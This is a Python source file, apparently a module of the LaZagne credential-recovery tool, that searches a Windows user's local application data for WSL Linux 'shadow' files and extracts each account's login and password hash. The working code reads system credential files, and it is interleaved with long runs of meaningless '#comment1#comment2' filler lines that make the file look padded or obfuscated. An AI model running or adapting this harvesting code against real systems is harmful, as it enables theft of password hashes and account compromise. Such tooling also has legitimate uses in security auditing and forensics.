# -*- coding: utf-8 -*-
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
from lazagne.config.module_info import ModuleInfo
from lazagne.config.constant import constant
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
import os
#comment1#comment2#comment3#comment4#comment1#comment2#comment3
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
class Wsl(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'wsl', 'sysadmin')
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1
    def run(self):
        pwd_found = []
        shadow_files_list = []
#comment1#comment2#comment3#comment4#comment1#comment2#comment3
        #comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
        old_path = os.path.join(constant.profile['LOCALAPPDATA'], u'lxss\\rootfs\\etc\\shadow')
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
        if os.path.exists(old_path):
            shadow_files_list.append(old_path)
#comment1#comment2#comment3#comment4#comment1#comment2#comment3
        #comment1#comment2#comment3#comment4
        new_path = os.path.join(constant.profile['LOCALAPPDATA'], u'Packages\\')
        if os.path.exists(new_path):
            for root, dirs, files in os.walk(new_path):
                for file in files:
                    if file == "shadow":
                        shadow_files_list.append(os.path.join(root, file))
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
        #comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1
        for shadow in shadow_files_list:
            with open(shadow, 'r') as shadow_file:
                for line in shadow_file.readlines():
                    user_hash = line.replace('\n', '')
                    line = user_hash.split(':')
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
                    #comment1#comment2#comment3#comment4#comment1#comment2#comment3
                    if not line[1] in ['x', '*', '!']:
                        pwd_found.append({
                            'Hash': ':'.join(user_hash.split(':')[1:]),
                            'Login': user_hash.split(':')[0].replace('\n', '')
                        })
        return pwd_found
